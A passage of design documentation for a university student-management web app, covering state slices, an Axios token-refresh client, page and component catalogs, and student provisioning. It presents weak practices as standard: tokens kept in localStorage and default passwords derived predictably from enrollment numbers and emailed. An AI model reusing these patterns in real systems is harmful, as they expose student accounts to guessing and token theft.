└── userSlice.ts      # Authentication domain state: user profile, tokens, role, status
```

### 5.3.1 Store Configuration (`src/store/index.ts`)
```typescript
import { configureStore } from '@reduxjs/toolkit';
import adminReducer from './adminSlice';
import userReducer from './userSlice';

export const store = configureStore({
  reducer: {
    admin: adminReducer,
    user: userReducer,
  },
  middleware: (getDefaultMiddleware) =>
    getDefaultMiddleware({
      serializableCheck: {
        // Ignore non-serializable dates in specific action payloads
        ignoredActions: ['admin/setLastUpdated'],
      },
    }),
});

export type RootState = ReturnType<typeof store.getState>;
export type AppDispatch = typeof store.dispatch;
```

### 5.3.2 Admin State Slice (`src/store/adminSlice.ts`)
The `adminSlice` encapsulates all data necessary for administrative queries and modifications:
- **State Interface**:
  ```typescript
  interface AdminState {
    students: Student[];
    totalStudents: number;
    currentPage: number;
    pageSize: number;
    totalPages: number;
    filters: {
      program: string;
      branch: string;
      year: string;
      section: string;
      searchTerm: string;
      placementStatus: string;
    };
    stats: {
      totalEnrolled: number;
      totalCoordinators: number;
      totalFaculty: number;
      averageAttendanceRate: number;
      placedCount: number;
    } | null;
    selectedStudent: Student | null;
    loading: boolean;
    error: string | null;
  }
  ```
- **Key Async Thunks**:
  - `fetchStudents(params)`: Dispatches `GET /api/admin/students` with active filter parameters.
  - `fetchStudentStats()`: Fetches institutional metrics.
  - `updateStudent(studentData)`: Sends `PUT /api/admin/students/:id` and updates local state immutably.
  - `bulkEditStudents({ ids, updates })`: Executes batch update and refreshes current view.

### 5.3.3 User & Authentication State Slice (`src/store/userSlice.ts`)
Manages the user's active session and authentication state:
- **State Interface**:
  ```typescript
  interface UserState {
    currentUser: UserProfile | null;
    token: string | null;
    isAuthenticated: boolean;
    role: 'admin' | 'coordinator' | 'chairperson' | 'faculty' | 'student' | null;
    loading: boolean;
    error: string | null;
  }
  ```
- **Reducers**:
  - `setCredentials({ user, token })`: Persists token in `localStorage` and updates Redux state.
  - `logoutUser()`: Clears `localStorage`, resets state to `null`, and disconnects authenticated sockets.
  - `updateCurrentUser(profileData)`: Merges updated profile fields into `currentUser`.

---

## 5.4 Network Client & Axios Interceptor Pipeline (`src/utils/api.ts`)

All network communication with the backend Express API is channeled through a centralized Axios client instance configured with defensive interceptors.

```mermaid
sequenceDiagram
    autonumber
    actor Component as React Component
    participant Axios as Axios Client
    participant ReqInt as Request Interceptor
    participant Backend as Express Backend
    participant ResInt as Response Interceptor
    participant Store as Redux UserSlice

    Component->>Axios: api.get('/admin/students')
    Axios->>ReqInt: Intercept outgoing request
    ReqInt->>ReqInt: Attach Authorization: Bearer <token>
    ReqInt->>Backend: HTTP GET /api/admin/students
    
    alt Success (200 OK)
        Backend-->>ResInt: HTTP 200 { success: true, data: [...] }
        ResInt-->>Component: return response.data
    else Token Expired (401 Unauthorized)
        Backend-->>ResInt: HTTP 401 TokenExpiredError
        ResInt->>Backend: POST /api/auth/refresh-token (with HttpOnly Cookie)
        alt Refresh Successful
            Backend-->>ResInt: HTTP 200 { token: "<new_token>" }
            ResInt->>Store: dispatch(setCredentials({ token: "<new_token>" }))
            ResInt->>Backend: Replay original request with new token
            Backend-->>Component: Return replayed response
        else Refresh Failed
            Backend-->>ResInt: HTTP 401 Session Expired
            ResInt->>Store: dispatch(logoutUser())
            ResInt-->>Component: Redirect to /login
        end
    end
```

### 5.4.1 Axios Instance Configuration
```typescript
import axios from 'axios';

const api = axios.create({
  baseURL: import.meta.env.VITE_API_BASE_URL || '/api',
  timeout: 30000, // 30-second network timeout
  withCredentials: true, // Required for HttpOnly refresh cookie transmission
  headers: {
    'Content-Type': 'application/json',
    'Accept': 'application/json',
  },
});

// Request Interceptor
api.interceptors.request.use(
  (config) => {
    const token = localStorage.getItem('token');
    if (token && config.headers) {
      config.headers.Authorization = `Bearer ${token}`;
    }
    return config;
  },
  (error) => Promise.reject(error)
);

// Response Interceptor
api.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;
      try {
        const refreshResponse = await axios.post('/api/auth/refresh-token', {}, { withCredentials: true });
        const newToken = refreshResponse.data.token;
        localStorage.setItem('token', newToken);
        originalRequest.headers.Authorization = `Bearer ${newToken}`;
        return api(originalRequest);
      } catch (refreshError) {
        localStorage.removeItem('token');
        window.location.href = '/login?session=expired';
        return Promise.reject(refreshError);
      }
    }
    return Promise.reject(error);
  }
);

export default api;
```



---

# SECTION 6: Frontend Pages Deep-Dive Catalog (All 28 Pages)

This section provides an exhaustive technical breakdown of every page component in the GBU-SDSM frontend codebase. Each page entry details its file location, role restrictions, internal state variables, React hooks, API calls, event handlers, and UI architecture.

---

## 6.1 Administrative Portal Pages (`src/pages/admin/`)

### 6.1.1 `AdminDashboard.tsx` (`src/pages/admin/AdminDashboard.tsx`)
- **Access Control**: Role: `admin`.
- **Primary Purpose**: Executive operational dashboard providing real-time institutional metrics, enrollment distributions, attendance health, and rapid administrative navigation.
- **Key State Variables**:
  - `stats`: Aggregated institutional counters (total students, total coordinators, total faculty, average attendance percentage, placed student count).
  - `enrollmentByProgram`: Array of objects mapping academic programs to student counts for graphical charting.
  - `recentAuditLogs`: Recent administrative actions and system events.
  - `isLoading`: Boolean loading flag.
  - `error`: Error message string if data fetching fails.
- **Hooks & Lifecycle**:
  - `useEffect`: Dispatches API calls to `/api/admin/statistics` and `/api/admin/audit-logs` on initial mount.
  - `useMemo`: Computes program percentage distributions and placement ratios.
- **DOM Structure & Visual Elements**:
  - Top header with university branding, system status indicator, and quick-action buttons ("Add Student", "Bulk Upload", "Export Database").
  - Stat grid rendering 5 high-impact metric cards with Lucide icons (`Users`, `GraduationCap`, `CalendarCheck`, `Briefcase`, `ShieldCheck`).
  - Dual analytical panels: Program-wise enrollment bar chart and gender/category distribution breakdown.
  - Audit activity stream displaying timestamped event logs with user identity tags.

### 6.1.2 `StudentList.tsx` (`src/pages/admin/StudentList.tsx`)
- **Access Control**: Role: `admin`.
- **Primary Purpose**: Centralized student directory management interface with multi-dimensional filtering, pagination, detailed single-student modal, and bulk editing capabilities.
- **Key State Variables**:
  - `students`: Array of `Student` records for the active page.
  - `filters`: Object containing `program`, `branch`, `year`, `section`, `category`, `gender`, `placed`, and `search`.
  - `selectedStudentIds`: Set/Array of student ID numbers selected via checkboxes for bulk operations.
  - `isBulkEditOpen`: Boolean controlling visibility of the Bulk Edit modal dialog.
  - `bulkEditFields`: Object holding target attribute updates for selected students.
  - `viewingStudent`: Student record currently opened in the detailed view drawer or modal.
  - `editingStudent`: Student record currently opened in the edit form.
  - `pagination`: Object holding `currentPage`, `pageSize`, `totalRecords`, and `totalPages`.
- **Hooks & Lifecycle**:
  - `useEffect`: Debounced fetch triggered whenever `filters` or `pagination.currentPage` changes.
  - `useCallback`: Memoized handlers for `handleSelectAll`, `handleToggleStudent`, and `handleExportData`.
- **User Interactions & Handlers**:
  - `handleSearchInput(e)`: Updates search filter with 300ms debounce.
  - `handleFilterChange(field, value)`: Updates respective filter and resets `currentPage` to 1.
  - `handleBulkEditSubmit()`: Calls `POST /api/admin/students/bulk-edit` with selected IDs and fields.
  - `handleExport(format)`: Generates downloadable Excel or CSV via SheetJS.

### 6.1.3 `BulkUploadPage.tsx` (`src/pages/admin/BulkUploadPage.tsx`)
- **Access Control**: Role: `admin`.
- **Primary Purpose**: Ingestion portal for multi-row student enrollment spreadsheets (`.xlsx`, `.xls`, `.csv`).
- **Key State Variables**:
  - `file`: Selected binary File object.
  - `dragActive`: Boolean state for drag-and-drop file styling.
  - `previewData`: First 10 rows parsed from the spreadsheet for visual confirmation.
  - `columnMappings`: Map of detected spreadsheet headers to SDSM student schema attributes.
  - `uploadStatus`: `'idle' | 'parsing' | 'uploading' | 'success' | 'error'`.
  - `validationErrors`: Array of row-by-row validation failure descriptions.
  - `uploadResult`: Summary object ({ totalRows, insertedCount, updatedCount, skippedCount }).
- **User Interactions**:
  - Drag-and-drop dropzone with file type validation.
  - Interactive header mapping selectors allowing manual correction of unmatched columns.
  - Process execution trigger with real-time progress bar.

### 6.1.4 `CoordinatorManagement.tsx` (`src/pages/admin/CoordinatorManagement.tsx`)
- **Access Control**: Role: `admin`.
- **Primary Purpose**: Administrative control interface for academic coordinators. Allows registering new coordinators, assigning specific program/branch/section batches, modifying assignments, and resetting coordinator access credentials.
- **Key State Variables**:
  - `coordinators`: List of all registered coordinator profiles.
  - `isCreateModalOpen`: Boolean modal toggle for new coordinator creation.
  - `formData`: Form state holding name, email, department, assigned program, branch, and section.
  - `searchTerm`: String filter for coordinator name or email.

### 6.1.5 `ChairpersonManagement.tsx` (`src/pages/admin/ChairpersonManagement.tsx`)
- **Access Control**: Role: `admin`.
- **Primary Purpose**: Creation and management of departmental Chairpersons and assignment of executive jurisdiction over academic departments and programs.
- **Key State Variables**:
  - `chairpersons`: List of chairpersons with their associated departments and programs.
  - `selectedPrograms`: Multi-select array of programs assigned to a chairperson.
  - `isAssignModalOpen`: Modal toggle for modifying departmental assignments.

### 6.1.6 `FacultyManagement.tsx` (`src/pages/admin/FacultyManagement.tsx`)
- **Access Control**: Role: `admin`.
- **Primary Purpose**: Faculty master directory. Displays teaching staff profiles, employee codes, designations, departments, contact details, and teaching assignment summaries.
- **Key Features**:
  - Search by employee code, name, or department.
  - Modal form for creating and updating faculty records.
  - Direct link to view courses and classes assigned to each faculty member.

### 6.1.7 `AdminAttendance.tsx` (`src/pages/admin/AdminAttendance.tsx`)
- **Access Control**: Role: `admin`.
- **Primary Purpose**: Institutional attendance surveillance. Allows administrators to inspect attendance records across any program, branch, section, or course, override mistaken session records, and lock or unlock historical attendance dates.
- **Key Features**:
  - Dropdown selectors for Program, Branch, Semester, Section, Subject, and Date Range.
  - Attendance session table with status badges (Present, Absent, Late, Excused).
  - Administrative session override modal with mandatory audit remark input.
  - Session lock/unlock toggle switch.

### 6.1.8 `ReportsPage.tsx` (`src/pages/admin/ReportsPage.tsx`)
- **Access Control**: Role: `admin`.
- **Primary Purpose**: Advanced reporting engine generating downloadable tabular and graphical reports for accreditation, institutional research, and placement cell tracking.
- **Report Types**:
  - Defaulter List Report (students with attendance below 75%).
  - Placement & Internship Summary (salary packages, top hiring partners, internship status).
  - Demographic & Category Distribution Report (GEN, OBC, SC, ST, EWS).
  - Academic Performance Distribution (CGPA brackets: >9.0, 8.0-9.0, 7.0-8.0, <7.0).

### 6.1.9 `SettingsPage.tsx` (`src/pages/admin/SettingsPage.tsx`)
- **Access Control**: Role: `admin`.
- **Primary Purpose**: Global system configuration parameters: active academic year, semester boundaries, attendance penalty thresholds, email notification server settings, and system backup triggers.

---

## 6.2 Coordinator Portal Pages (`src/pages/coordinator/`)

### 6.2.1 `CoordinatorDashboard.tsx` (`src/pages/coordinator/CoordinatorDashboard.tsx`)
- **Access Control**: Role: `coordinator`.
- **Primary Purpose**: Home view for academic batch coordinators. Displays vital operational metrics for their assigned section.
- **Key Metrics Displayed**:
  - Assigned Class Badge (e.g. "B.Tech CSE - 3rd Year Section A").
  - Enrolled Students count.
  - Batch Average Attendance percentage with trend sparkline.
  - Defaulter Alert Card (count of students below 75% attendance).
  - Recent attendance sessions and unread communications.

### 6.2.2 `CoordinatorStudents.tsx` (`src/pages/coordinator/CoordinatorStudents.tsx`)
- **Access Control**: Role: `coordinator`.
- **Primary Purpose**: Section roster management. Coordinators can view complete student profiles, execute single student edits, launch the Bulk Edit modal for batch updates, and export the section roster.
- **Key Features & Recent Fixes**:
  - Seamless in-place student editing: Clicking edit opens `StudentForm` within a modal or drawer without triggering unintended redirects to the dashboard.
  - Bulk Edit Toolbar: Select multiple students via checkboxes and open the bulk editor to modify batch parameters (semester, section, status, placement fields).
  - Detailed Student Drawer: Displays all student details including the 8 new internship and placement fields (company, DOJ, DOE, paid/unpaid status, stipend, package).

### 6.2.3 `CoordinatorAttendance.tsx` (`src/pages/coordinator/CoordinatorAttendance.tsx`)
- **Access Control**: Role: `coordinator`.
- **Primary Purpose**: Class attendance hub. Allows the coordinator to mark attendance sessions for their assigned class, view historical sessions, modify session entries within permissible limits, and identify chronic absentees.

### 6.2.4 `CoordinatorMessages.tsx` (`src/pages/coordinator/CoordinatorMessages.tsx`)
- **Access Control**: Role: `coordinator`.
- **Primary Purpose**: Section communication terminal. Allows broadcasting announcements to all students in the assigned class or sending direct messages to individual students, faculty instructors, or the administrator.

---

## 6.3 Chairperson Portal Pages (`src/pages/chairperson/`)

### 6.3.1 `ChairpersonDashboard.tsx` (`src/pages/chairperson/ChairpersonDashboard.tsx`)
- **Access Control**: Role: `chairperson`.
- **Primary Purpose**: Departmental executive overview aggregating metrics across multiple programs and sections under the chairperson's authority.
- **Key Features**:
  - Program-by-program student count breakdown.
  - Faculty workload metrics (total teaching assignments, active courses).
  - Departmental attendance averages with comparative section benchmarks.

### 6.3.2 `ChairpersonClasses.tsx` (`src/pages/chairperson/ChairpersonClasses.tsx`)
- **Access Control**: Role: `chairperson`.
- **Primary Purpose**: Departmental class catalog. Displays all academic sections, assigned coordinators, enrolled student counts, and course schedules.

### 6.3.3 `ChairpersonFaculty.tsx` (`src/pages/chairperson/ChairpersonFaculty.tsx`)
- **Access Control**: Role: `chairperson`.
- **Primary Purpose**: Faculty workload management. Allows viewing departmental faculty and assigning them to specific courses and class sections.

### 6.3.4 `ChairpersonStudents.tsx` (`src/pages/chairperson/ChairpersonStudents.tsx`)
- **Access Control**: Role: `chairperson`.
- **Primary Purpose**: Multi-class student exploration across the entire department with filtering by program, branch, year, section, and placement status.

### 6.3.5 `ChairpersonAttendance.tsx` (`src/pages/chairperson/ChairpersonAttendance.tsx`)
- **Access Control**: Role: `chairperson`.
- **Primary Purpose**: Departmental attendance audit interface with section comparison reports and defaulter export tools.

---

## 6.4 Faculty Portal Pages (`src/pages/faculty/`)

### 6.4.1 `FacultyDashboard.tsx` (`src/pages/faculty/FacultyDashboard.tsx`)
- **Access Control**: Role: `faculty`.
- **Primary Purpose**: Faculty workspace providing immediate access to assigned classes, today's lecture schedule, and pending attendance marking tasks.
- **Key Metrics**:
  - Assigned Classes count.
  - Total Enrolled Students across all assigned courses.
  - Sessions Conducted this month.
  - Quick action to open attendance marking for today's active session.

### 6.4.2 `FacultyClasses.tsx` (`src/pages/faculty/FacultyClasses.tsx`)
- **Access Control**: Role: `faculty`.
- **Primary Purpose**: Class directory listing all courses and sections mapped to the faculty member via `FacultyAssignment`. Clicking a class displays its enrolled student roster.

### 6.4.3 `FacultyAttendance.tsx` (`src/pages/faculty/FacultyAttendance.tsx`)
- **Access Control**: Role: `faculty`.
- **Primary Purpose**: Core attendance marking terminal.
- **User Flow**:
  1. Faculty selects assigned class and course from dropdown.
  2. Selects date and session type (Lecture, Lab, Tutorial).
  3. Class roster loads with all students defaulted to "Present".
  4. Faculty toggles absent students via one-click toggles or bulk action ("Mark All Present", "Mark All Absent").
  5. Clicks "Submit Attendance" to persist session atomically via `POST /api/attendance/sessions`.

### 6.4.4 `FacultyProfile.tsx` (`src/pages/faculty/FacultyProfile.tsx`)
- **Access Control**: Role: `faculty`.
- **Primary Purpose**: Personal faculty profile view and editor (name, designation, department, contact information, research interests).

### 6.4.5 `FacultyMessages.tsx` (`src/pages/faculty/FacultyMessages.tsx`)
- **Access Control**: Role: `faculty`.
- **Primary Purpose**: Faculty communication center for messaging enrolled students, coordinators, or administration.

---

## 6.5 Student / Client Portal Pages (`src/pages/client/`)

### 6.5.1 `ClientDashboard.tsx` (`src/pages/client/ClientDashboard.tsx`)
- **Access Control**: Role: `student` (client).
- **Primary Purpose**: Student home portal presenting personal academic status, aggregate attendance meter, upcoming timetable classes, and recent notifications.
- **Key Elements**:
  - Radial Attendance Gauge with color coding (Green: $\ge 75\%$, Amber: $65-74\%$, Red: $< 65\%$).
  - Quick summary cards for Enrolled Semester, Program, Section, and Current CGPA.
  - Recent announcements list.

### 6.5.2 `ClientProfile.tsx` (`src/pages/client/ClientProfile.tsx`)
- **Access Control**: Role: `student`.
- **Primary Purpose**: Comprehensive student dossier displaying demographic, academic, contact, and placement/internship records. Includes self-service update requests for permissible fields.

### 6.5.3 `ClientAttendance.tsx` (`src/pages/client/ClientAttendance.tsx`)
- **Access Control**: Role: `student`.
- **Primary Purpose**: Transparent attendance ledger. Displays subject-by-subject attendance percentages, total lectures conducted vs attended, and a calendar view of individual session presence.

### 6.5.4 `ClientTimetable.tsx` (`src/pages/client/ClientTimetable.tsx`)
- **Access Control**: Role: `student`.
- **Primary Purpose**: Interactive weekly schedule grid showing lecture times, subject names, course codes, instructors, and classroom numbers.

### 6.5.5 `ClientMessages.tsx` (`src/pages/client/ClientMessages.tsx`)
- **Access Control**: Role: `student`.
- **Primary Purpose**: Student notification inbox displaying broadcast messages and class announcements with read/unread tracking.

---

## 6.6 Teaching & Public Pages

### 6.6.1 `TeachingDashboard.tsx` (`src/pages/teaching/TeachingDashboard.tsx`)
- **Access Control**: Role: `faculty`, `coordinator`.
- **Primary Purpose**: Syllabus progression and academic calendar tracker across courses.

### 6.6.2 `LandingPage.tsx` (`src/pages/LandingPage.tsx`)
- **Access Control**: Public.
- **Primary Purpose**: High-impact institutional showcase for Gautam Buddha University SDSM. Features hero banner, quick portal login links, news highlights, and campus statistics.

### 6.6.3 Authentication Pages (`LoginPage.tsx`, `RegisterPage.tsx`, `ForgotPassword.tsx`, `ResetPassword.tsx`)
- Responsive credential intake forms with input validation, password reveal toggles, OTP input fields with countdown timers, and role selector tabs.



---

# SECTION 7: Frontend Component Library & UI Systems

This section catalogs the core reusable and domain-specific UI components that power the GBU-SDSM presentation tier. Each entry documents component props, state hooks, DOM structure, event lifecycles, and styling conventions.

---

## 7.1 Student Domain Components

### 7.1.1 `StudentForm.tsx` (`src/components/StudentForm.tsx`)
- **Primary Function**: Comprehensive multi-tab form used by Administrators and Coordinators for creating new student profiles and editing existing student records.
- **Props Interface**:
  ```typescript
  interface StudentFormProps {
    initialData?: Partial<Student> | null;
    isOpen: boolean;
    onClose: () => void;
    onSubmit: (studentData: Partial<Student>) => Promise<void>;
    isEditMode: boolean;
    userRole?: 'admin' | 'coordinator' | 'chairperson';
  }
  ```
- **Tab Structure**:
  1. **Personal Information**: Name, Enrollment Number, Roll Number, Date of Birth, Gender, Blood Group, Category (GEN/OBC/SC/ST/EWS), Religion, Nationality, Aadhaar Number.
  2. **Contact & Family**: Student Mobile, Personal Email, University Email, Father's Name, Father's Contact, Mother's Name, Mother's Contact, Guardian Details, Permanent Address, Current/Correspondence Address, City, State, Pincode.
  3. **Academic Information**: Program (B.Tech, M.Tech, MCA, MBA), Branch, Academic Year, Semester, Section, Admission Year, High School (10th) Board & Percentage, Intermediate (12th) Board & Percentage, Current CGPA, Backlogs Count.
  4. **Internship & Placement Information**:
     - *Internship Details*: Has Internship toggle, Company Name, Date of Joining (DOJ), Date of Exit / Completion (DOE), Paid or Unpaid radio selection, Monthly Stipend Amount (if paid), Internship Role/Designation.
     - *Placement Details*: Placement Status toggle (`Placed` vs `Unplaced`), Hiring Company Name, CTC / Annual Salary Package (e.g., `"12.5 LPA"`), Date of Joining (DOJ), Placement Role / Job Title, Job Location, Is Paid Training radio toggle.
- **Validation Engine**:
  - Validates enrollment number format against university patterns (`^[0-9]{10}$`).
  - Asserts email format validity.
  - Validates chronological sanity: Date of Joining must precede Date of Exit.
  - Sanitizes numeric inputs for CGPA ($0.00 \le \text{CGPA} \le 10.00$) and percentages ($0 \le \text{pct} \le 100$).
- **Event Lifecycle**:
  - `handleChange(field, value)`: Updates internal form state and clears field-specific validation error.
  - `handleTabSwitch(tabIndex)`: Switches active form tab without data loss.
  - `handleSubmit(e)`: Prevents default browser submission, runs schema validation, and triggers `onSubmit(formData)` async handler.

### 7.1.2 `StudentDetailComponent.tsx` & `CategoryView.tsx`
- **Primary Function**: High-fidelity, read-only dossier modal rendering all demographic, academic, contact, and career attributes of a student.
- **Props Interface**:
  ```typescript
  interface StudentDetailComponentProps {
    student: Student;
    isOpen: boolean;
    onClose: () => void;
    onEdit?: (student: Student) => void;
    canEdit?: boolean;
  }
  ```
- **CategoryView Segmentation**:
  - `CategoryView` splits the student record into structured visual cards with clean tabular layout:
    - **Header Block**: Avatar photo, Full Name, Enrollment Number, Program & Section badge, Status indicator.
    - **Demographic Card**: DOB, Gender, Category, Blood Group, Aadhaar.
    - **Academic History Card**: 10th %, 12th %, Current Semester, CGPA badge.
    - **Career & Placement Card**: Displays the full internship and placement breakdown:
      - Internship Status, Company, Duration (DOJ to DOE), Stipend & Paid/Unpaid badge.
      - Placement Status, Hiring Company, Annual Package, Joining Date.
- **Action Buttons**:
  - "Edit Profile": Emits `onEdit(student)` allowing coordinators/admins to transition straight into edit mode.
  - "Print / Export PDF": Generates clean print view with university letterhead.
  - "Close": Dismisses the modal.

### 7.1.3 `BulkEditModal.tsx`
- **Primary Function**: Batch modification modal accessible to Administrators, Chairpersons, and Academic Coordinators. Enables applying identical changes across multiple selected student records simultaneously.
- **Props Interface**:
  ```typescript
  interface BulkEditModalProps {
    isOpen: boolean;
    onClose: () => void;
    selectedStudentIds: number[];
    onConfirm: (updates: Partial<Student>) => Promise<void>;
    scope?: 'class' | 'department' | 'universal';
  }
  ```
- **Batch Modifiable Fields**:
  - Academic Semester & Academic Year.
  - Section Reassignment (e.g. migrating Section A to Section B).
  - Academic Status (`Active`, `Graduated`, `Suspended`, `Withdrawn`).
  - Fee Status (`Paid`, `Pending`, `Partial`).
  - Placement Status (`Placed`, `Unplaced`) and Company Name.
  - Batch Internship updates (Company, Paid/Unpaid, DOJ, DOE).
- **Execution Safeguards**:
  - Displays explicit confirmation tally: *"You are about to modify 38 selected student records"*.
  - Requires checking a confirmation toggle before the "Apply Bulk Changes" button enables.

---

## 7.2 Attendance Domain Components

### 7.2.1 `AttendanceSession.tsx`
- **Primary Function**: Real-time attendance marking terminal for instructors and batch coordinators.
- **Props Interface**:
  ```typescript
  interface AttendanceSessionProps {
    classDetails: {
      program: string;
      branch: string;
      semester: number;
      section: string;
      subject: string;
      subjectCode: string;
    };
    roster: StudentRosterItem[];
    onSubmitSession: (sessionData: AttendanceSessionPayload) => Promise<void>;
    isSubmitting: boolean;
  }
  ```
- **Roster Interactive Table**:
  - Lists students ordered by Roll Number / Enrollment Number.
  - Interactive Status Selector for each student: `Present` (Green button), `Absent` (Red button), `Late` (Yellow button), `Excused` (Blue button).
  - Inline remark input field for noting reasons (e.g. "Hospitalized", "Sports meet").
- **Batch Control Toolbar**:
  - "Mark All Present": One-click action setting every student status to Present.
  - "Mark All Absent": Rapid reset.
  - Summary Header: Dynamically calculates live counts: Total Students, Present Count, Absent Count, Attendance Percentage for the current session.

### 7.2.2 `AttendanceReport.tsx`
- **Primary Function**: Visual attendance summary rendering tabular and graphical statistics for a class or department.
- **Features**:
  - Filter bar for Subject, Date Range, and Defaulter threshold ($< 75\%$).
  - Student attendance ledger showing total lectures conducted vs attended.
  - Color-coded percentage indicators: Green ($ge 75%$), Yellow ($65% - 74%$), Red ($< 65%$).
  - One-click export to CSV and Excel via SheetJS.

---

## 7.3 Communication & Messaging Components

### 7.3.1 `MessagesCenter.tsx`
- **Primary Function**: Integrated communication console supporting direct messaging, class broadcast announcements, and institutional notifications.
- **Sub-Components**:
  - `MessageList`: Paginated inbox list displaying sender avatar, subject, preview snippet, timestamp, and read/unread status.
  - `MessageReader`: Full view of selected message with recipient tags, priority badge, and reply button.
  - `MessageComposerModal`: New message modal supporting recipient type selection:
    - *Individual*: Autocomplete search by name, enrollment number, or email.
    - *Class*: Dropdown selectors for Program, Branch, Semester, Section.
    - *Universal Broadcast*: Restricted to Administrators.
  - Priority selector (`Normal`, `Important`, `Urgent`).

---

## 7.4 Navigation & Layout Components

### 7.4.1 `Navbar.tsx`
- **Primary Function**: Global top navigation header.
- **Features**:
  - Gautam Buddha University emblem and SDSM brand typography.
  - User identity badge: User name, role badge (`Admin`, `Coordinator`, `Faculty`, `Chairperson`, `Student`).
  - Unread notification bell with counter badge.
  - User profile dropdown with "My Profile", "Settings", and "Logout" actions.

### 7.4.2 `Sidebar.tsx`
- **Primary Function**: Role-sensitive side navigation panel.
- **Dynamic Navigation Configuration**:
  - Automatically evaluates active user role and renders corresponding navigation links.
  - Active route highlighting using React Router's `NavLink`.
  - Collapsible drawer on mobile/tablet viewports with backdrop overlay.

---

## 7.5 Shared UI Utility Components

### 7.5.1 `DataTable.tsx`
- Generic reusable data table supporting client-side and server-side pagination, multi-column sorting, selection checkboxes, and empty state fallbacks.

### 7.5.2 `Modal.tsx` & `Drawer.tsx`
- Accessible overlay dialogs rendered via React Portals directly into `document.body`. Includes keyboard escape listener, backdrop click dismiss, and focus trapping.

### 7.5.3 `StatCard.tsx`
- Metric visualization card displaying title, numerical value, trend indicator (+5% vs last month), and thematic icon with colored background ring.



---

# SECTION 8: Core Business Workflows, Algorithms & Data Flow Pipelines

This section provides an exhaustive technical specification of the seven foundational business workflows and core algorithms governing GBU-SDSM. Every workflow is detailed with end-to-end data flow diagrams, transaction boundaries, mathematical models, heuristic algorithms, edge case handling, and database operations.

---

## 8.1 Student Lifecycle & Account Provisioning Workflow

The student lifecycle governs every transition from initial onboarding and institutional account provisioning through semester progressions, placement recording, and alumni archival.

```mermaid
sequenceDiagram
    autonumber
    actor Admin as Administrator / Coordinator
    participant Controller as StudentController
    participant Validator as StudentSchemaValidator
    participant Bcrypt as bcryptjs Engine
    participant DB as MySQL Database Engine (Sequelize)
    participant Mailer as NotificationService
    actor Student as Student User

    Admin->>Controller: POST /api/admin/students { studentData }
    Controller->>Validator: validateStudentPayload(studentData)
    
    alt Schema Validation Fails
        Validator-->>Controller: validationErrors[]
        Controller-->>Admin: 400 Bad Request { success: false, errors: validationErrors }
    else Validation Passes
        Controller->>DB: sequelize.transaction()
        Note over Controller,DB: Transaction Boundary Established
        Controller->>DB: User.findOne({ where: { [Op.or]: [{ email }, { enrollmentNo }] }, transaction })
        alt Duplicate Conflict Detected
            DB-->>Controller: existingRecord
            Controller->>DB: transaction.rollback()
            Controller-->>Admin: 409 Conflict { message: "Enrollment number or email already registered" }
        else Uniqueness Verified
            Controller->>Bcrypt: hash(defaultPassword, 10)
            Bcrypt-->>Controller: passwordHash
            Controller->>DB: User.create({ email, password: passwordHash, role: 'student', isActive: true, isApproved: true }, { transaction })
            DB-->>Controller: createdUser
            Controller->>DB: Student.create({ ...studentData, userId: createdUser.id }, { transaction })
            DB-->>Controller: createdStudent
            Controller->>DB: transaction.commit()
            Note over Controller,DB: Transaction Committed Successfully
            Controller->>Mailer: dispatchWelcomeCredentials(student.email, defaultPassword)
            Controller-->>Admin: 201 Created { success: true, student: createdStudent }
            Mailer-->>Student: Email: Account Credentials & Portal Link
        end
    end
```

### 8.1.1 Default Credential Derivation Heuristic
When a student profile is provisioned programmatically without an explicit password, the system derives an initial temporary password following the deterministic university standard:
$$\text{Default Password} = \text{"GBU@"} + \text{EnrollmentNumber}$$
*(For example: `GBU@2500100481`)*.
Upon first successful authentication, the frontend detects that the account is flagged with `isFirstLogin === true`, triggering a mandatory password change modal requiring the student to establish a cryptographically secure personal password before navigating to the dashboard.

---

## 8.2 Excel Ingestion & Heuristic Header Matching Algorithm

The automated spreadsheet ingestion pipeline allows administrators and batch coordinators to import hundreds of student records from heterogeneous spreadsheet templates without requiring manual column renaming.

```mermaid
flowchart TD
    A[Excel Upload: .xlsx / .xls / .csv] --> B[Multer Memory Buffer]
    B --> C[xlsx.read Buffer -> Sheet to JSON]
    C --> D[Extract Raw Header Row]
    D --> E[Fuzzy Heuristic Header Normalizer]
    E --> F{Required Headers Present?}
    F -- No --> G[Reject Upload: Missing Critical Fields Error]
    F -- Yes --> H[Iterate Data Rows in Memory]
    H --> I[Row-Level Data Sanitization & Type Coercion]
    I --> J{Row Valid?}
    J -- No --> K[Append to ValidationErrors Array]
    J -- Yes --> L[Prepare User & Student Record Tuple]
    K --> M{Next Row Exists?}
    L --> M
    M -- Yes --> H
    M -- No --> N[Begin Atomic Sequelize Transaction]
    N --> O[Bulk Insert Users: User.bulkCreate]
    O --> P[Bulk Insert Students: Student.bulkCreate]
    P --> Q{Transaction Succeeded?}
    Q -- Yes --> R[Commit Transaction & Return Ingestion Summary]
    Q -- No --> S[Rollback Transaction & Return 500 Database Error]
```

### 8.2.1 Fuzzy Header Normalization Engine
Spreadsheets generated by various university departments frequently exhibit minor header naming discrepancies (e.g., `"Enrollment Number"`, `"Enrollment_No"`, `"Reg No"`, `"Registration #"`, `"ENROLLMENT"`). GBU-SDSM executes a multi-stage fuzzy heuristic normalization algorithm:

1. **String Normalization Function**:
   $$\text{clean}(s) = s.\text{toLowerCase}().\text{replace}(/[\^a-z0-9]/g, '')</p>
2. **Canonical Header Alias Dictionary**:
   The ingestion engine checks cleaned header strings against an exhaustive dictionary of canonical aliases:

| Target Model Field | Canonical Name | Accepted Fuzzy Aliases & Patterns |
| :--- | :--- | :--- |
| `enrollmentNo` | `enrollmentno` | `enrollmentno`, `enrollment`, `enrollmentnumber`, `regno`, `registrationno`, `admno`, `admissionno`, `rollno`, `rollnumber` |
| `name` | `name` | `name`, `studentname`, `fullname`, `candidatename`, `nameofstudent` |
| `email` | `email` | `email`, `emailid`, `studentemail`, `mail`, `universityemail`, `officialemail` |
| `program` | `program` | `program`, `programme`, `course`, `degree` |
| `branch` | `branch` | `branch`, `department`, `discipline`, `stream`, `specialization` |
| `year` | `year` | `year`, `academicyear`, `currentyear`, `classyear` |
| `semester` | `semester` | `semester`, `sem`, `currentsem` |
| `section` | `section` | `section`, `sec`, `batch`, `division` |
| `dob` | `dob` | `dob`, `dateofbirth`, `birthdate`, `bday` |
| `gender` | `gender` | `gender`, `sex` |
